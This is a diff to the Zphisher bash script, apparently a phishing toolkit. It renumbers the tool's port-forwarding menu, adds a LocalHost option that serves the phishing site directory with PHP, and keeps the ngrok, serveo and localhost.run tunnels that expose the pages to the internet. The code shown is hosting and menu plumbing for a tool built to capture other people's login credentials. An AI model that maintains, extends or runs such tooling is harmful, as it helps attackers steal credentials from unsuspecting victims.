@@ -1,4 +1,4 @@
-# Zphisher V_1.0
+# Zphisher V_1.1
 # ==============================================
 # Created By HTR-TECH @tahmid.rayat
 # Instagram : https://instagram.com/tahmid.rayat
@@ -207,19 +207,22 @@ rm -rf linksender
 fi
 
 printf "\n"
-printf "\e[96m[\e[0m\e[1;77m01\e[96m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
-printf "\e[96m[\e[0m\e[1;77m02\e[96m]\e[0m\e[1;93m Serveo.net\e[0m\n"
-printf "\e[96m[\e[0m\e[1;77m03\e[96m]\e[0m\e[1;93m Localhost.run\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m01\e[96m]\e[0m\e[1;93m LocalHost\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m02\e[96m]\e[0m\e[1;93m Ngrok.io\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m03\e[96m]\e[0m\e[1;93m Serveo.net\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m04\e[96m]\e[0m\e[1;93m Localhost.run\e[0m\n"
 d_o_server="2"
 printf "\e[0m\n"
 read -p $'\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Select a Port Forwarding option: \e[0m\e[1;96m\en' option_server
 option_server="${option_server:-${d_o_server}}"
-if [[ $option_server == 2 || $option_server == 02 ]]; then
+if [[ $option_server == 3 || $option_server == 03 ]]; then
 start_s
-elif [[ $option_server == 1 || $option_server == 01 ]]; then
+elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start_n
-elif [[ $option_server == 3 || $option_server == 03 ]]; then
+elif [[ $option_server == 4 || $option_server == 04 ]]; then
 start_local
+elif [[ $option_server == 1 || $option_server == 01 ]]; then
+start_l
 else
 printf "\e[1;93m [!] Invalid option [!]\e[0m\n"
 sleep 1
@@ -332,7 +335,7 @@ read port
 port="${port:-${def_port}}"
 printf "\e[0m\n"
 printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
-cd htdocs && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[0m\n"
 printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
@@ -344,6 +347,20 @@ printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m
 printf "\e[1;93m\n"
 ssh -R 80:localhost:$port ssh.localhost.run 2>&1
 printf "\e[0m\n"
+}
+start_l() {
+def_port="5555"
+printf "\e[0m\n"
+printf '\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+printf "\e[0m\n"
+printf "\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+sleep 2
+printf "\e[0m\n"
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;92m Successfully Hosted at :\e[0m\e[1;93m http://localhost:$port\e[0m\n"
+found
 }
 found() {
 
